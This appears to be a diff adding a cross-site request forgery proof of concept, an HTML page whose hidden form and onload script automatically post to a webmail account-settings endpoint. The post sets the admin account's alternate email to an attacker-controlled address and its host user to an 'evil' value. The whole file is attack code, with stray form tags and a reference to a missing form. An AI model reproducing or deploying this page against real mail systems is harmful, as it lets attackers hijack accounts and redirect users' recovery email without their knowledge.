@@ -1,0 +1,20 @@
+<html>
+</form>
+<form method=POST name="frm1" action="/mail/accountsettings_add.html">
+<input type="hidden" name="id" value="x">
+<input type="hidden" name="accountid" value="0">
+<input type="hidden" name="Save_x" value="1">
+<input type="hidden" name="account[USER]" value="admin.com/admin">
+<input type="hidden" name="account[EMAIL]" value="admin@admin.com">
+<input type="hidden" name="account[PASS]" value="******">
+<input type="hidden" name="account[PASS2]" value="******">
+<input type="hidden" name="account[FULLNAME]" value="">
+<input type="hidden" name="account[ALTEMAIL]" value="evil@192.168.98.15">
+<input type="hidden" name="account[HOSTUSER]" value="admin.com/evil">
+<input type="hidden" name="account[COLOR]" value="">
+<input type="hidden" name="Save_x" value="Save+Changes">
+</form>
+<body onload='document.frm1.id.value = document.main.id.value;
+document.frm1.submit(); '>
+<form>
+</html>
